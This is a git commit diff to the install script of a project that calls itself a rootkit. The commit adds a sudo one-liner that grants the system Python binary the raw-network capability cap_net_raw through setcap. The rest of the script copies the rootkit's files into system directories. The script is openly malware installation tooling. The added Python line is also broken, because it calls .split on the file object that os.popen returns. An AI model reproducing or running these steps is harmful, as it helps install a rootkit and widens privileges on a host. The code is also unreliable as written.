587806d701fd4cd04eee3b4cb2c625fa849e1818
Ido Barel <55856610+idobarel@users.noreply.github.com>
2022-04-25 02:13:25 +0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 echo "GodZilo's Root-Kit Installation:"
 echo "Running..."
+sudo python3 -c "import os; arr=os.popen('python3 --version').split(' ')[1].split('.');x=f'python{arr[0]}.{arr[1]}';os.system(f'sudo setcap cap_net_raw=eip /usr/bin/{x}')"
 sudo pip3 install -r requirements.txt
 cp main.py rootkit
 sudo cp -r www /usr/local/bin/
